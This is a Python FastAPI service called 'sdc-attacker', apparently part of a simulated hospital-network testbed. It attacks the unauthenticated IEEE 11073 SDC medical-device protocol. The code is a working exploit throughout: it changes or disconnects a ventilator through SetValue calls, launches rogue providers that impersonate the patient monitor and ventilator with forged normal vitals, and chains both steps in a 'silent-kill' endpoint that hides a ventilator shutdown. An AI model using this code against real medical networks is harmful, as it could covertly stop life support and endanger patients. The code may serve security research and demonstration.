"""sdc-attacker — adversary on the IEEE 11073 SDC network.

Two faithful attack vectors, both exploiting the absence of authentication in
plain SDC:

  * actuation injection — the attacker is an SDC consumer and invokes a real
    SetValue operation on the ventilator's (unauthenticated) set service, e.g.
    connected = 0. The validated physiology then deteriorates.

  * telemetry injection — the attacker launches a rogue SDC provider
    (rogue_monitor.py) that impersonates the patient monitor at the same bed.
    Because SDC does not authenticate providers, a consumer cannot tell the
    counterfeit from the real device and renders the forged "all normal" vitals.

silent-kill combines them: bring up the rogue monitor, then disconnect the
ventilator. A console (the redesign view, served at /) drives these.
"""

from __future__ import annotations

import contextlib
import os
import socket
import subprocess
import threading
import time
import urllib.request
import uuid
from decimal import Decimal

from fastapi import FastAPI, Body
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware

from sdc11073.consumer import SdcConsumer
from sdc11073.definitions_sdc import SdcV1Definitions
from sdc11073.mdib import ConsumerMdib
from sdc11073.wsdiscovery import WSDiscovery
from sdc11073.xml_types.actions import periodic_actions

PULSE_BASE = os.environ.get("PULSE_BASE", "http://pulse-patient:8000")
BRIDGE_BASE = os.environ.get("BRIDGE_BASE", "http://sdc-bridge:8000")
BASE_UUID = uuid.UUID("{cc013678-79f6-403c-998f-3cc0cc050230}")
VENT = uuid.uuid5(BASE_UUID, "hbt-ventilator")
VENT_HANDLE = {"tidal_volume": "set.tidal_volume", "resp_rate": "set.resp_rate",
               "peep": "set.peep", "fio2": "set.fio2"}

state = {"vent": None}  # SDC consumer to the ventilator (for SetValue)
rogues = {}             # name -> Popen (rogue provider subprocesses)


def my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close(); return ip


def discover_ventilator():
    disco = WSDiscovery(my_ip()); disco.start()
    while state["vent"] is None:
        for s in disco.search_services(types=SdcV1Definitions.MedicalDeviceTypesFilter):
            if s.epr == VENT.urn:
                c = SdcConsumer.from_wsd_service(s, ssl_context_container=None)
                c.start_all(not_subscribed_actions=periodic_actions)
                ConsumerMdib(c).init_mdib()
                state["vent"] = c
                print("[sdc-attacker] reached ventilator over SDC", flush=True)
        time.sleep(2)


def set_vent(handle, value):
    return state["vent"].set_service_client.set_numeric_value(handle, Decimal(str(value))).result(timeout=10)


def do_ventilator(settings: dict):
    for key, handle in VENT_HANDLE.items():
        if settings.get(key) is not None:
            set_vent(handle, settings[key])
    if settings.get("connected") is not None:
        set_vent("set.connected", 1 if settings["connected"] else 0)


def do_disconnect():
    set_vent("set.connected", 0)


def start_rogue(script, name):
    if rogues.get(name) and rogues[name].poll() is None:
        return  # already running
    rogues[name] = subprocess.Popen(["python", os.path.join(os.path.dirname(__file__), script)])
    print(f"[sdc-attacker] launched {name}", flush=True)


def wait_until_rendered(timeout_s=15):
    """Block until the bridge has discovered and bound the rogue providers (more
    than one device claims each identity), so the spoofed display is in place
    before any subsequent disconnect, avoiding a flicker of the true status."""
    import json as _json
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(BRIDGE_BASE + "/api/devices", timeout=3) as r:
                d = _json.loads(r.read().decode())
            if d.get("monitor", 0) > 1 and d.get("ventilator", 0) > 1:
                return True
        except Exception:
            pass
        time.sleep(0.5)
    return False


def stop_rogues():
    for name, p in list(rogues.items()):
        if p and p.poll() is None:
            p.terminate()
            try:
                p.wait(timeout=5)
            except subprocess.TimeoutExpired:
                p.kill()
        rogues.pop(name, None)


@contextlib.asynccontextmanager
async def lifespan(app: FastAPI):
    threading.Thread(target=discover_ventilator, daemon=True).start()
    yield
    stop_rogues()


app = FastAPI(title="sdc-attacker", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])


@app.get("/healthz")
def healthz():
    active = [n for n, p in rogues.items() if p and p.poll() is None]
    return {"ok": True, "vent": state["vent"] is not None, "rogues_active": active}


@app.post("/spoof")
def spoof(body: dict = Body(default={})):
    start_rogue("rogue_monitor.py", "rogue-monitor")
    start_rogue("rogue_ventilator.py", "rogue-ventilator")
    rendered = wait_until_rendered()
    return {"ok": True, "rendered": rendered,
            "action": "telemetry injection (rogue monitor + rogue ventilator impersonating the devices)"}


@app.post("/ventilator")
def ventilator(body: dict = Body(default={})):
    do_ventilator(body or {})
    return {"ok": True, "action": "actuation injection over SDC", "applied": body}


@app.post("/disconnect")
def disconnect():
    do_disconnect()
    return {"ok": True, "action": "actuation injection (ventilator disconnected)"}


@app.post("/silent-kill")
def silent_kill():
    start_rogue("rogue_monitor.py", "rogue-monitor")        # spoof the patient monitor
    start_rogue("rogue_ventilator.py", "rogue-ventilator")  # spoof the ventilator display
    rendered = wait_until_rendered()                         # spoofed displays in place first
    do_disconnect()                                          # then stop real ventilation
    return {"ok": True, "rendered": rendered,
            "action": "silent kill (rogue monitor + rogue ventilator + disconnect over SDC)"}


@app.post("/reset")
def reset():
    stop_rogues()
    urllib.request.urlopen(urllib.request.Request(PULSE_BASE + "/api/reset", method="POST"), timeout=3).read()
    return {"ok": True, "action": "reset (rogues removed, ventilator reconnected, physiology reset)"}


# Serve the high-fidelity redesign attacker console (and its shared assets).
app.mount("/", StaticFiles(directory=os.path.join(os.path.dirname(__file__), "static"), html=True), name="static")
